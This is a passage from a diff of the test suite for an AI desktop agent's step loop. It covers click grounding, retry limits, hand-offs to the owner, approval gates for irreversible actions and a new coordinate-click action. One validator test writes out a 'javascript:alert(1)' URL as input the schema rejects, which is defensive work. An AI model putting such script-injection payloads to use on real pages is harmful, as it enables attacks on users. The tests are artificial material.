@@ -5,7 +5,7 @@ import { NEXT_STEP_TOOL, intentSchema, parseNextStep, resolvePlaceholders } from
 import { clockBlock } from "../lib/time/clock.ts";
 import { createDesktopPort } from "../lib/agent/desktop-port.ts";
 import { matchControl } from "../lib/agent/grounding.ts";
-import { MAX_REPEATS, MAX_STEPS, SHELL_MAX_STEPS, SHELL_MAX_TOKENS, runTask, weightedTokens } from "../lib/agent/step-loop.ts";
+import { MAX_REPEATS, MAX_SCROLL_REPEATS, MAX_STEPS, SHELL_MAX_STEPS, SHELL_MAX_TOKENS, runTask, weightedTokens } from "../lib/agent/step-loop.ts";
 import { ownerInputBodySchema } from "../lib/desktop/client.ts";
 import { isValidKeyChord } from "../lib/desktop/key-chord.ts";
 import { CostStopError } from "../lib/costs/types.ts";
@@ -251,21 +251,26 @@ test("the default-deny action allowlist stops the run before any input", async (
 test("clicks run only on grounder points inside the screen; the model never supplies coordinates", async () => {
   const click = step({ action: "click", target: "Submit button", expect: "confirmation" });
   const none = await run({ provider: fakeProvider([click]) });
-  assert.equal(none.result.outcome, "needs_owner"); assert.deepEqual(noInput(none.deps.desktop.calls), []);
-  assert.match(none.cards[0].text, /can't locate/);
+  assert.equal(none.result.outcome, "repeat_limit"); assert.deepEqual(noInput(none.deps.desktop.calls), []);
   for (const point of [{ x: 1024, y: 5, method: "t" }, { x: -1, y: 5, method: "t" }, { x: 1.5, y: 5, method: "t" }]) {
     const out = await run({ provider: fakeProvider([click]), grounder: { ground: async () => point } });
-    assert.equal(out.result.outcome, "needs_owner"); assert.deepEqual(noInput(out.deps.desktop.calls), []);
+    assert.equal(out.result.outcome, "repeat_limit"); assert.deepEqual(noInput(out.deps.desktop.calls), []);
   }
   let seen;
   const grounded = await run({ provider: fakeProvider([click, step({ action: "finish", summary: "ok" })]),
     grounder: { ground: async (intent, shot, snapshot) => { seen = [intent, shot, snapshot]; return { x: 300, y: 200, method: "page_structure" }; } } });
-  assert.deepEqual(noInput(grounded.deps.desktop.calls), []);
-  assert.equal(grounded.result.outcome, "needs_owner", "a valid point alone is insufficient without named DOM evidence");
+  assert.deepEqual(noInput(grounded.deps.desktop.calls), [], "a valid point alone is insufficient without named DOM evidence");
   assert.equal(grounded.result.steps[0].groundingMethod, "page_structure"); assert.equal(seen[0].target, "Submit button");
   assert.equal(seen[2].controls[0].name, "Message", "grounder sees the current page");
   const throwing = await run({ provider: fakeProvider([click]), grounder: { ground: async () => { throw new Error("boom"); } } });
-  assert.equal(throwing.result.outcome, "needs_owner");
+  assert.deepEqual(noInput(throwing.deps.desktop.calls), []);
+});
+
+test("different targets that keep missing hand off to the owner once the model has run out of tries", async () => {
+  const provider = fakeProvider(Array.from({ length: 12 }, (_, index) => step({ action: "click", target: `Missing thing ${index}`, expect: "x" })));
+  const stuck = await run({ provider, desktop: fakeDesktop({ snapshot: async () => page([["button", "Place order"]]) }) });
+  assert.equal(stuck.result.outcome, "needs_owner"); assert.deepEqual(noInput(stuck.deps.desktop.calls), []);
+  assert.equal(stuck.cards.length, 1); assert.match(stuck.cards[0].text, /can't locate that control/); assert.match(stuck.cards[0].text, /closed shadow root/);
 });
 
 test("a click is grounded on the page structure: the real control is clicked at its centre and recorded", async () => {
@@ -279,7 +284,7 @@ test("a click is grounded on the page structure: the real control is clicked at 
   assert.ok(!/\b(?:140|175|100|160)\b/.test(controls.text.replace(/https?:\S+/, "")), "no coordinates reach the model");
 });
 
-test("a first miss gives the model one correction turn with visible names; the next miss hands off once", async () => {
+test("a miss gives the model a correction turn with visible names, and nothing is clicked while it keeps missing", async () => {
   const miss = step({ action: "click", target: "Submit order", expect: "confirmation" });
   const desktop = fakeDesktop({ snapshot: async () => page([["button", "Place order"], ["link", "Help"]]) });
   const retry = fakeProvider([miss, step({ action: "click", target: "Place order button", expect: "confirmation" }), step({ action: "finish", summary: "ok" })]);
@@ -288,15 +293,13 @@ test("a first miss gives the model one correction turn with visible names; the n
   assert.equal(fixed.result.steps.length, 1);
   const second = retry.requests[1].messages[0].content;
   assert.deepEqual(JSON.parse(second[1].text).previous_steps[0], { step: 1, action: "click", target: "Submit order", expect: "confirmation", result: "target_not_found" });
-  assert.equal(second[3].sourceTag, "web"); assert.match(second[3].text, /matched no single control\. Closest visible names: "Place order", "Help"\./);
+  assert.equal(second[3].sourceTag, "web"); assert.match(second[3].text, /matched no single control\. Give the control's \[number\] as ref if several share a name\. Closest visible names: "Place order", "Help"\./);
   assert.ok(!/matched no single control/.test(retry.requests[2].messages[0].content[3].text), "the hint is shown once");
 
   const twice = fakeDesktop({ snapshot: async () => page([["button", "Place order"]], { frames: 1 }) });
   const stuck = await run({ provider: fakeProvider([miss, step({ action: "click", target: "Confirm purchase", expect: "x" })]), desktop: twice });
-  assert.equal(stuck.result.outcome, "needs_owner"); assert.deepEqual(noInput(twice.calls), []);
-  assert.equal(stuck.cards.length, 1); assert.match(stuck.cards[0].text, /can't locate that control/); assert.match(stuck.cards[0].text, /closed shadow root/);
-  const noFrames = await run({ provider: fakeProvider([miss]), desktop: fakeDesktop({ snapshot: async () => page([["button", "Place order"]]) }) });
-  assert.equal(noFrames.result.outcome, "needs_owner"); assert.match(noFrames.cards[0].text, /closed shadow root/);
+  assert.equal(stuck.result.outcome, "repeat_limit"); assert.deepEqual(noInput(twice.calls), []);
+  assert.equal(stuck.cards.length, 1);
 });
 
 test("a miss followed by a different action does not count toward the hand-off", async () => {
@@ -306,16 +309,16 @@ test("a miss followed by a different action does not count toward the hand-off",
   assert.equal(result.outcome, "finished");
 });
 
-test("an unreadable page sends no control list and hands a click back at once; takeover during the read pauses the run", async () => {
+test("an unreadable page sends no control list and never gets a click; takeover during the read pauses the run", async () => {
   const click = step({ action: "click", target: "Save button", expect: "saved" });
   const failing = fakeDesktop({ snapshot: async () => { throw Object.assign(new Error("grounding_unavailable"), { code: "grounding_unavailable" }); } });
   const provider = fakeProvider([click]);
   const out = await run({ provider, desktop: failing });
-  assert.equal(out.result.outcome, "needs_owner"); assert.equal(provider.requests.length, 1);
-  assert.equal(provider.requests[0].messages[0].content.length, 3); assert.match(out.cards[0].text, /can't locate/);
-  assert.ok(!/embedded frame/.test(out.cards[0].text));
+  assert.deepEqual(noInput(out.deps.desktop.calls), []);
+  assert.equal(provider.requests[0].messages[0].content.length, 3);
   const typed = await run({ provider: fakeProvider([step({ action: "type", text: "x", expect: "y" }), step({ action: "finish", summary: "ok" })]), desktop: failing });
-  assert.equal(typed.result.outcome, "needs_owner", "typing and keys now require readable focused-control evidence");
+  assert.deepEqual(noInput(typed.deps.desktop.calls), [["type", "x"]], "the desktop worker reads the real focus, whether or not the control list could be read");
+  assert.equal(typed.result.outcome, "finished");
   const takeover = Object.assign(new Error("takeover_active"), { code: "takeover_active" });
   const paused = await run({ desktop: fakeDesktop({ snapshot: async () => { throw takeover; } }) });
   assert.equal(paused.result.outcome, "paused_by_owner"); assert.equal(paused.deps.provider.requests.length, 0);
@@ -357,8 +360,16 @@ test("takeover and desktop failures stop without further input", async () => {
   assert.equal(duringInput.result.outcome, "paused_by_owner"); assert.equal(duringInput.result.steps.length, 0);
   const duringShot = await run({ desktop: fakeDesktop({ screenshot: async () => { throw takeover; } }) });
   assert.equal(duringShot.result.outcome, "paused_by_owner"); assert.equal(duringShot.deps.provider.requests.length, 0);
-  const other = await run({ provider: fakeProvider([type]), desktop: fakeDesktop({ type: async () => { throw new Error("x"); } }) });
+  // Input that may have landed ends the run; the session is quarantined and nothing is replayed.
+  const uncertain = Object.assign(new Error("uncertain_outcome"), { code: "uncertain_outcome" });
+  const other = await run({ provider: fakeProvider([type, step({ action: "finish", summary: "should not run" })]), desktop: fakeDesktop({ type: async () => { throw uncertain; } }) });
   assert.equal(other.result.outcome, "desktop_error"); assert.equal(other.cards.length, 1);
+  // Any other desktop failure on a routine step goes back to the model with its code.
+  const provider = fakeProvider([type, step({ action: "finish", summary: "ok" })]);
+  const busy = Object.assign(new Error("page_busy"), { code: "page_busy" });
+  const recovered = await run({ provider, desktop: fakeDesktop({ type: async () => { throw busy; } }) });
+  assert.equal(recovered.result.outcome, "finished");
+  assert.equal(JSON.parse(provider.requests[1].messages[0].content[1].text).previous_steps[0].code, "page_busy");
 });
 
 test("step limit, repeat limit, provider errors and cancellation stop the run with one card", async () => {
@@ -366,8 +377,16 @@ test("step limit, repeat limit, provider errors and cancellation stop the run wi
   const varied = fakeProvider([(() => step({ action: "wait", expect: `change ${n++}` }))].map((f) => () => f()));
   const limited = await run({ provider: varied, maxSteps: 3 });
   assert.equal(limited.result.outcome, "step_limit"); assert.equal(limited.result.steps.length, 3); assert.equal(limited.cards.length, 1);
-  const repeated = await run({ provider: fakeProvider([step({ action: "scroll", direction: "down", expect: "more" })]) });
+  // The same step on an unchanged screen is stuck: the model hears it once, then the run stops.
+  const repeatProvider = fakeProvider([step({ action: "wait", expect: "more" })]);
+  const repeated = await run({ provider: repeatProvider });
   assert.equal(repeated.result.outcome, "repeat_limit"); assert.equal(repeated.result.steps.length, MAX_REPEATS - 1);
+  assert.equal(JSON.parse(repeatProvider.requests[3].messages[0].content[1].text).previous_steps.at(-1).code, "repeated_no_effect");
+  // The same step that keeps changing the screen is work, but not forever.
+  let frame = 0;
+  const moving = fakeDesktop({ screenshot: async () => ({ ...SHOT, base64: `${SHOT.base64}${"A".repeat(4 * (frame++ % 50))}` }) });
+  const scrolling = await run({ desktop: moving, provider: fakeProvider([step({ action: "scroll", direction: "down", expect: "more" })]), verification: { samState: "off", visual: { observe: async () => ({ status: "pass", name: "", role: "" }), verify: async () => "pass" } } });
+  assert.equal(scrolling.result.outcome, "repeat_limit"); assert.equal(scrolling.result.steps.length, MAX_SCROLL_REPEATS - 1, "a long page takes many scrolls, but not forever");
   const failing = await run({ provider: fakeProvider([new Error("network down: SECRET_TOKEN")]) });
   assert.equal(failing.result.outcome, "provider_error"); assert.ok(!JSON.stringify(failing.cards).includes("SECRET_TOKEN"));
   const controller = new AbortController(); controller.abort();
@@ -665,11 +684,16 @@ test("navigate opens an allowed http(s) page, refuses another host, and the sche
   assert.equal(intentSchema.safeParse({ action: "navigate", url: "javascript:alert(1)", expect: "x" }).success, false);
 });
 
-test("a page that never loads hands back to the owner instead of reporting a desktop error", async () => {
-  const desktop = actionDesktop();
-  desktop.navigate = async () => { throw Object.assign(new Error("navigation_failed"), { code: "navigation_failed" }); };
-  const { result } = await run({ agent: fileAgent(["click", "type"]), desktop, task: "Open the settings page.", allowedHosts: ["a.example"],
-    provider: fakeProvider([step({ action: "navigate", url: "https://a.example/settings", expect: "loaded" })]) });
+test("a page that does not load goes back to the model, and only repeated failures reach the owner", async () => {
+  const failing = () => { const desktop = actionDesktop(); desktop.navigate = async () => { throw Object.assign(new Error("navigation_failed"), { code: "navigation_failed" }); }; return desktop; };
+  const nav = (path) => step({ action: "navigate", url: `https://a.example/${path}`, expect: "loaded" });
+  const provider = fakeProvider([nav("one"), step({ action: "finish", summary: "That page is down." })]);
+  const once = await run({ agent: fileAgent(["click", "type"]), desktop: failing(), task: "Open the settings page.", allowedHosts: ["a.example"], provider });
+  assert.equal(once.result.outcome, "finished");
+  assert.equal(previousSteps(provider.requests[1])[0].code, "navigation_failed");
+  assert.equal(previousSteps(provider.requests[1])[0].url, "https://a.example/one");
+  const { result } = await run({ agent: fileAgent(["click", "type"]), desktop: failing(), task: "Open the settings page.", allowedHosts: ["a.example"],
+    provider: fakeProvider(Array.from({ length: 10 }, (_, index) => nav(`p${index}`))) });
   assert.equal(result.outcome, "needs_owner");
   assert.match(result.finalCard.text, /couldn't open that page/);
   assert.match(result.finalCard.text, /desktop is still running/);
@@ -990,10 +1014,10 @@ test("a file step gets its own checkpoint, and a blocked or unverified step is c
   const { result } = await run({
     receipts: proofSink(), checkpoints,
     verification: { samState: "off", visual: { observe: async () => ({ status: "unknown", name: "", role: "" }), verify: async () => "fail" } },
-    provider: fakeProvider([step({ action: "wait", expect: "change 1" })]),
+    provider: fakeProvider(Array.from({ length: 6 }, (_, index) => step({ action: "wait", expect: `change ${index}` }))),
   });
   assert.equal(result.outcome, "needs_owner");
-  assert.deepEqual(captured.map((item) => item.idx), [0, 1], "the unverified step was recorded, so it is checkpointed");
+  assert.deepEqual(captured.map((item) => item.idx), [0, 1, 2, 3, 4, 5, 6], "each unverified step was recorded, so it is checkpointed");
   assert.deepEqual(captured[1].history, [["wait", "failed"]], "a step whose check failed is remembered as failed");
 });
 
@@ -1802,4 +1826,399 @@ test("ADR-040 the available tool list is sent as untrusted tool data", async () 
   assert.equal(part.sourceTag, "tool");
   assert.match(part.text, /github\.create_issue/);
   assert.doesNotMatch(requests[0].instructions, /Create an issue/);
+});
+
+// ---- Retry instead of stopping; list numbers; navigation keys ----
+const unverified = (statuses) => ({ samState: "off", visual: {
+  observe: async () => ({ status: "unknown", name: "", role: "" }),
+  verify: async () => statuses.shift() ?? "pass",
+} });
+const previousSteps = (request) => JSON.parse(request.messages[0].content[1].text).previous_steps;
+const twoButtons = (name, extra = {}) => fakeDesktop({ snapshot: async () => page([["button", name], ["button", name]], extra) });
+
+test("a routine step that could not be verified goes back to the model, and the final card says so", async () => {
+  const provider = fakeProvider([step({ action: "scroll", direction: "down", expect: "more rows" }), step({ action: "wait", expect: "rows shown" }), step({ action: "finish", summary: "Done." })]);
+  const receipts = [];
+  const { result, cards } = await run({ provider, receipts: proofSink(receipts), verification: unverified(["unknown", "pass"]) });
+  assert.equal(result.outcome, "finished");
+  assert.equal(previousSteps(provider.requests[1])[0].code, "postcondition_unknown");
+  assert.equal(previousSteps(provider.requests[1])[0].result, "executed", "a check that could not judge is no evidence that the step failed");
+  assert.deepEqual(receipts.map((receipt) => receipt.result), ["unknown", "pass"], "the receipt still records the unverified step");
+  assert.match(cards[0].text, /1 other step could not be verified/);
+});
+
+test("only the sixth failed step in a row hands off; a verified step resets the count and an unjudged one never counts", async () => {
+  const waits = (count) => Array.from({ length: count }, (_, index) => step({ action: "wait", expect: `change ${index}` }));
+  const stuck = await run({ provider: fakeProvider(waits(6)), verification: unverified(Array(6).fill("fail")) });
+  assert.equal(stuck.result.outcome, "needs_owner"); assert.match(stuck.cards[0].text, /was not verified/);
+  const recovers = await run({ provider: fakeProvider([...waits(9), step({ action: "finish", summary: "ok" })]), verification: unverified(["fail", "fail", "fail", "fail", "pass", "fail", "fail", "fail", "fail"]) });
+  assert.equal(recovers.result.outcome, "finished");
+  // The run that started all this: a checker that cannot judge anything must not end the run.
+  const blind = await run({ provider: fakeProvider([...waits(12), step({ action: "finish", summary: "ok" })]), verification: unverified(Array(12).fill("unknown")) });
+  assert.equal(blind.result.outcome, "finished");
+});
+
+test("an irreversible step that could not be verified still stops at once", async () => {
+  const desktop = fakeDesktop({ snapshot: async () => page([["button", "Delete invoice"]]) });
+  const provider = fakeProvider([step({ action: "click", target: "Delete invoice", expect: "invoice gone" }), step({ action: "finish", summary: "ok" })]);
+  const verification = { samState: "off", visual: { observe: async () => ({ status: "pass", name: "Delete invoice", role: "button" }), verify: async () => "unknown" } };
+  const { result } = await run({ provider, desktop, verification });
+  assert.equal(result.outcome, "needs_owner"); assert.equal(provider.requests.length, 1);
+});
+
+test("the list number tells apart controls that share a name; without it the tie is never clicked", async () => {
+  const desktop = twoButtons("Add to cart");
+  const provider = fakeProvider([step({ action: "click", target: "Add to cart", ref: 2, expect: "item added" }), step({ action: "finish", summary: "ok" })]);
+  const { result } = await run({ provider, desktop });
+  assert.equal(result.outcome, "finished");
+  const expected = (await desktop.snapshot()).controls[1];
+  assert.deepEqual(noInput(desktop.calls), [["click", expected.x + Math.floor(expected.width / 2), expected.y + Math.floor(expected.height / 2)]]);
+
+  const tie = twoButtons("Add to cart");
+  await run({ provider: fakeProvider([step({ action: "click", target: "Add to cart", expect: "item added" })]), desktop: tie });
+  assert.deepEqual(noInput(tie.calls), []);
+});
+
+test("a list number picks the control whatever the words say, and risk reads the real control's name", async () => {
+  const desktop = fakeDesktop({ snapshot: async () => page([["button", "Close"], ["link", "Help"]]) });
+  const expected = (await desktop.snapshot()).controls[1];
+  const { result } = await run({ provider: fakeProvider([step({ action: "click", target: "the question mark icon", ref: 2, expect: "help opens" }), step({ action: "finish", summary: "ok" })]), desktop });
+  assert.equal(result.outcome, "finished");
+  assert.deepEqual(noInput(desktop.calls), [["click", expected.x + Math.floor(expected.width / 2), expected.y + Math.floor(expected.height / 2)]]);
+  // Innocent words on a number that points at a Delete button still wait for approval.
+  const asked = [];
+  const risky = fakeDesktop({ snapshot: async () => page([["button", "Delete account"]]) });
+  await run({ provider: fakeProvider([step({ action: "click", target: "the settings icon", ref: 1, expect: "settings open" }), step({ action: "finish", summary: "ok" })]), desktop: risky,
+    approvals: { request: async (input) => { asked.push(input.actionClass); return { decision: "deny", waitedMs: 0, reason: "denied" }; } } });
+  assert.deepEqual(asked, ["delete"]); assert.deepEqual(noInput(risky.calls), []);
+});
+
+test("a list number cannot pick an irreversible control whose name is not unique", async () => {
+  const desktop = twoButtons("Delete");
+  const provider = fakeProvider([step({ action: "click", target: "Delete", ref: 2, expect: "row gone" }), step({ action: "finish", summary: "ok" })]);
+  const verification = { samState: "off", visual: { observe: async () => ({ status: "pass", name: "Delete", role: "button" }), verify: async () => "pass" } };
+  const { result } = await run({ provider, desktop, verification });
+  assert.equal(result.outcome, "needs_owner"); assert.deepEqual(noInput(desktop.calls), []); assert.equal(provider.requests.length, 1);
+});
+
+test("a routine click asks no model before it runs", async () => {
+  const desktop = fakeDesktop({ snapshot: async () => page([["searchbox", "Search the web"]]) });
+  const click = step({ action: "click", target: "Search the web", expect: "field focused" });
+  const noObserver = { samState: "off", visual: { observe: async () => { throw new Error("no gate request on a routine step"); }, verify: async () => "pass" } };
+  const allowed = await run({ provider: fakeProvider([click, step({ action: "finish", summary: "ok" })]), desktop, verification: noObserver });
+  assert.equal(allowed.result.outcome, "finished"); assert.equal(noInput(desktop.calls).length, 1);
+});
+
+test("navigation keys work with nothing focused; Enter does not", async () => {
+  const blank = () => fakeDesktop({ snapshot: async () => page([["link", "Help"]]) });
+  for (const keys of ["Escape", "PageDown", "Tab", "Shift+Tab"]) {
+    const desktop = blank();
+    const { result } = await run({ provider: fakeProvider([step({ action: "key", keys, expect: "view moved" }), step({ action: "finish", summary: "ok" })]), desktop });
+    assert.equal(result.outcome, "finished", keys); assert.deepEqual(noInput(desktop.calls), [["key", keys]]);
+  }
+  const desktop = blank();
+  await run({ provider: fakeProvider([step({ action: "key", keys: "Enter", expect: "form sent" }), step({ action: "finish", summary: "ok" })]), desktop });
+  assert.deepEqual(noInput(desktop.calls), []);
+});
+
+test("Enter on a focused risky button asks for approval like a click on it", async () => {
+  const controls = [{ ref: 1, role: "button", name: "Delete account", tag: "button", x: 100, y: 100, width: 80, height: 30, focused: true }];
+  const desktop = fakeDesktop({ snapshot: async () => page([["button", "Delete account"]], { controls }) });
+  const asked = [];
+  const { result } = await run({ desktop, provider: fakeProvider([step({ action: "key", keys: "Enter", expect: "dialog closes" })]),
+    approvals: { request: async (input) => { asked.push(input.actionClass); return { decision: "deny", waitedMs: 0, reason: "denied" }; } } });
+  assert.deepEqual(asked, ["delete"]); assert.equal(result.outcome, "needs_owner"); assert.deepEqual(noInput(desktop.calls), []);
+});
+
+test("input the desktop worker refused before sending is a setback, not a desktop error", async () => {
+  const refused = Object.assign(new Error("sensitive_target"), { code: "sensitive_target" });
+  const provider = fakeProvider([step({ action: "type", text: "x", expect: "y" }), step({ action: "ask_owner", question: "Please fill in this field." })]);
+  const { result } = await run({ provider, desktop: fakeDesktop({ type: async () => { throw refused; } }) });
+  assert.equal(result.outcome, "asked_owner"); assert.equal(previousSteps(provider.requests[1])[0].code, "sensitive_target");
+});
+
+test("the schema accepts a list number and still rejects coordinates", () => {
+  assert.equal(intentSchema.safeParse({ action: "click", target: "Add to cart", ref: 3, expect: "added" }).success, true);
+  for (const ref of [0, 151, 1.5, "3"]) assert.equal(intentSchema.safeParse({ action: "click", target: "Add", ref, expect: "added" }).success, false, String(ref));
+  assert.equal(intentSchema.safeParse({ action: "click", target: "Add", ref: 3, x: 5, y: 5, expect: "added" }).success, false);
+});
+
+// ---- ADR-041: click_at ----
+const SCREEN_AGENT = { id: AGENT_A, name: "Ada", role: "Researcher", soulMd: "s", actions: ["click_at", "click", "type", "key", "scroll", "wait"] };
+const screenDesktop = (kind = "browser", overrides = {}) => {
+  const desktop = fakeDesktop({ activeWindow: async () => kind, ...overrides });
+  desktop.screenClick = overrides.screenClick ?? (async (x, y, button) => { desktop.calls.push(["screenClick", x, y, ...(button && button !== "left" ? [button] : [])]); });
+  desktop.screenType = overrides.screenType ?? (async (text, terminal) => { desktop.calls.push(["screenType", text, terminal]); });
+  desktop.screenKey = overrides.screenKey ?? (async (keys, terminal) => { desktop.calls.push(["screenKey", keys, terminal]); });
+  return desktop;
+};
+const clickAt = (extra = {}) => step({ action: "click_at", x: 40, y: 750, target: "Files icon on the taskbar", expect: "the file manager opens", ...extra });
+const clickUp = (extra = {}) => clickAt({ y: 500, target: "Downloads folder", ...extra });
+const finish = step({ action: "finish", summary: "ok" });
+const pointCheck = (status) => ({ samState: "off", visual: { observe: async () => ({ status: "unknown", name: "", role: "" }), verify: async () => "pass", confirmPoint: async () => status } });
+
+test("click_at is refused and not offered unless the agent's Actions include it", async () => {
+  const desktop = screenDesktop();
+  const provider = fakeProvider([clickAt()]);
+  const { result, cards } = await run({ provider, desktop });
+  assert.equal(result.outcome, "needs_owner"); assert.deepEqual(noInput(desktop.calls), []);
+  assert.match(cards[0].text, /not allowed to use the "click_at" action/);
+  const parameters = provider.requests[0].tools[0].parameters.properties;
+  assert.ok(!parameters.action.enum.includes("click_at")); assert.equal(parameters.x, undefined); assert.equal(parameters.y, undefined);
+  assert.ok(!/Screen clicks/.test(provider.requests[0].instructions));
+});
+
+test("click_at is off for every default action set", async () => {
+  const { KNOWN_ACTIONS } = await import("../lib/agents/actions.ts");
+  assert.ok(!KNOWN_ACTIONS.includes("click_at"));
+});
+
+test("a routine click_at runs at the model's point, offers the action, and writes a receipt with the point", async () => {
+  const desktop = screenDesktop();
+  const provider = fakeProvider([clickAt(), finish]);
+  const receipts = [];
+  const { result } = await run({ agent: SCREEN_AGENT, desktop, provider, receipts: proofSink(receipts), verification: pointCheck("unknown") });
+  assert.equal(result.outcome, "finished"); assert.deepEqual(noInput(desktop.calls), [["screenClick", 40, 750]]);
+  assert.ok(provider.requests[0].tools[0].parameters.properties.action.enum.includes("click_at"));
+  assert.match(provider.requests[0].instructions, /Computer use:/);
+  assert.deepEqual(receipts[0].action, { kind: "click_at", x: 40, y: 750, target: "Files icon on the taskbar" });
+  assert.equal(receipts[0].grounding_method, "model_coordinates");
+});
+
+test("a routine click_at asks no model about the model's own point", async () => {
+  const desktop = screenDesktop();
+  const provider = fakeProvider([clickAt(), finish]);
+  const { result } = await run({ agent: SCREEN_AGENT, desktop, provider, verification: pointCheck("fail") });
+  assert.deepEqual(noInput(desktop.calls), [["screenClick", 40, 750]]); assert.equal(result.outcome, "finished");
+});
+
+test("Computer use also double-clicks, right-clicks, drags and scrolls, each in its receipt", async () => {
+  const desktop = screenDesktop("browser", { screenDrag: async (...args) => { desktop.calls.push(["screenDrag", ...args]); }, screenScroll: async (...args) => { desktop.calls.push(["screenScroll", ...args]); } });
+  const receipts = [];
+  const { result } = await run({ agent: SCREEN_AGENT, desktop, receipts: proofSink(receipts), verification: pointCheck("pass"), provider: fakeProvider([
+    step({ action: "click_at", x: 40, y: 50, button: "double", target: "Downloads folder", expect: "folder opens" }),
+    step({ action: "drag_at", x: 10, y: 20, to_x: 300, to_y: 400, target: "the window title bar", expect: "window moved" }),
+    step({ action: "scroll_at", x: 500, y: 300, direction: "left", target: "the file list", expect: "list moved" }),
+    finish,
+  ]) });
+  assert.equal(result.outcome, "finished");
+  assert.deepEqual(noInput(desktop.calls), [["screenClick", 40, 50, "double"], ["screenDrag", 10, 20, 300, 400], ["screenScroll", 500, 300, "left", 3]]);
+  assert.deepEqual(receipts.map((receipt) => receipt.action.kind), ["click_at", "drag_at", "scroll_at"]);
+  assert.equal(receipts[0].action.button, "double");
+});
+
+test("native point: a routine named click uses it and the receipt says the provider's review was waived; a risky one never does", async () => {
+  const desktop = screenDesktop();
+  const receipts = [];
+  const visualGrounders = { computer: { locate: async () => null, proposePoint: async () => ({ x: 297, y: 357, reviewWaived: true }) } };
+  const { result } = await run({ agent: SCREEN_AGENT, desktop, visualGrounders, receipts: proofSink(receipts), verification: pointCheck("pass"), provider: fakeProvider([clickUp(), finish]) });
+  assert.equal(result.outcome, "finished");
+  assert.deepEqual(noInput(desktop.calls), [["screenClick", 297, 357]]);
+  assert.equal(receipts[0].grounding_method, "computer_use");
+  assert.ok(receipts[0].methods.some((item) => item.code === "provider_review_waived_by_owner"));
+  // The receipt keeps what the model asked for and where the click really went.
+  assert.deepEqual([receipts[0].action.x, receipts[0].action.y], [40, 500]);
+  assert.deepEqual(receipts[0].action.landed, { x: 297, y: 357 });
+  // The dock's positions are exact, so a click there keeps them.
+  const dock = screenDesktop();
+  let askedForDock = false;
+  await run({ agent: SCREEN_AGENT, desktop: dock, verification: pointCheck("pass"), visualGrounders: { computer: { locate: async () => null, proposePoint: async () => { askedForDock = true; return { x: 1, y: 1, reviewWaived: true }; } } }, provider: fakeProvider([clickAt(), finish]) });
+  assert.equal(askedForDock, false); assert.deepEqual(noInput(dock.calls), [["screenClick", 40, 750]]);
+
+  const riskyDesktop = screenDesktop();
+  let proposed = false;
+  await run({ agent: SCREEN_AGENT, desktop: riskyDesktop, verification: pointCheck("pass"),
+    visualGrounders: { computer: { locate: async () => null, proposePoint: async () => { proposed = true; return { x: 1, y: 1, reviewWaived: true }; } } },
+    provider: fakeProvider([step({ action: "click_at", x: 40, y: 50, target: "Delete everything button", expect: "deleted" }), finish]) });
+  assert.equal(proposed, false); assert.deepEqual(noInput(riskyDesktop.calls), [], "send, delete, purchase and post still need two methods");
+
+  // No point from the provider: the plan's own point stands.
+  const planned = screenDesktop();
+  await run({ agent: SCREEN_AGENT, desktop: planned, verification: pointCheck("pass"), visualGrounders: { computer: { locate: async () => null, proposePoint: async () => null } }, provider: fakeProvider([clickUp(), finish]) });
+  assert.deepEqual(noInput(planned.calls), [["screenClick", 40, 500]]);
+});
+
+test("a model is only offered actions this agent may use, and an unoffered one goes back to it once", async () => {
+  const provider = fakeProvider([step({ action: "shell", command: "ls", expect: "listed" }), step({ action: "finish", summary: "Did it another way." })]);
+  const { result } = await run({ provider, shell: { run: async () => { throw new Error("must not run"); } } });
+  const offered = provider.requests[0].tools[0].parameters.properties.action.enum;
+  for (const name of ["click", "type", "navigate", "select", "extract", "key", "scroll", "wait", "finish", "ask_owner", "get_time"]) assert.ok(offered.includes(name), name);
+  for (const name of ["shell", "tool_call", "hear_audio", "click_at", "drag_at", "scroll_at", "deliver_file", "remember", "start_desktop"]) assert.ok(!offered.includes(name), name);
+  assert.ok(!/Shell: run one command/.test(provider.requests[0].instructions));
+  assert.match(provider.requests[0].instructions, /turn on Computer use/, "the owner hears what would help");
+  assert.equal(result.outcome, "finished");
+  assert.equal(previousSteps(provider.requests[1])[0].code, "not_allowed");
+  const twice = await run({ provider: fakeProvider([step({ action: "shell", command: "ls", expect: "listed" })]) });
+  assert.equal(twice.result.outcome, "needs_owner"); assert.match(twice.cards[0].text, /not allowed to use the "shell" action/);
+});
+
+test("connected apps are offered only when this run has some, and models get a plain correction for bad keys", async () => {
+  const none = fakeProvider([step({ action: "finish", summary: "ok" })]);
+  await run({ provider: none, agent: fileAgent(["tool_call"]) });
+  assert.ok(!none.requests[0].tools[0].parameters.properties.action.enum.includes("tool_call"));
+  const some = fakeProvider([step({ action: "finish", summary: "ok" })]);
+  await run({ provider: some, agent: fileAgent(["tool_call"]), toolCatalog: [{ name: "github.list_repos", description: "List" }] });
+  assert.ok(some.requests[0].tools[0].parameters.properties.action.enum.includes("tool_call"));
+  assert.match(some.requests[0].instructions, /available_tools/);
+  const provider = fakeProvider([step({ action: "key", keys: "Bacon", expect: "x" }), step({ action: "finish", summary: "ok" })]);
+  await run({ provider });
+  assert.match(previousSteps(provider.requests[1])[0].expect, /To enter text use the type action/);
+});
+
+test("model steps tolerate common slips: key spellings, a missing expect, a target left out with a ref or point", async () => {
+  const parse = (args) => parseNextStep([{ type: "function_call", callId: "c", name: "next_step", arguments: JSON.stringify(args) }]);
+  for (const [written, keys] of [["ctrl+l", "Control+l"], ["Ctrl + Shift + T", "Control+Shift+t"], ["return", "Enter"], ["ESC", "Escape"], ["pagedown", "PageDown"], ["down", "ArrowDown"], ["cmd+a", "Meta+a"], ["f5", "F5"]]) {
+    const out = parse({ action: "key", keys: written, expect: "x" });
+    assert.equal(out.ok && out.intent.keys, keys, written);
+  }
+  assert.equal(parse({ action: "key", keys: "Bacon", expect: "x" }).ok, false, "text is never a key");
+  assert.match(parse({ action: "wait" }).intent.expect, /result of this step/);
+  assert.equal(parse({ action: "click", ref: 4 }).intent.target, "control 4");
+  assert.equal(parse({ action: "click_at", x: 1, y: 2 }).intent.target, "the chosen point");
+  assert.equal(parse({ action: "click" }).ok, false, "a click with neither words nor a number names nothing");
+  assert.equal(parse({ action: "scroll", direction: "down", x: 3, y: 4, expect: "x" }).ok, false, "coordinates on another action still reject the step");
+  assert.equal(parse({ action: "click_at", x: 5000, y: 2, target: "t", expect: "x" }).ok, false);
+});
+
+test("an irreversible click_at never runs on the model's coordinates alone", async () => {
+  for (const target of ["Delete account", "Send message", "Buy now", "Publish post"]) {
+    const desktop = screenDesktop();
+    const provider = fakeProvider([clickAt({ target }), finish]);
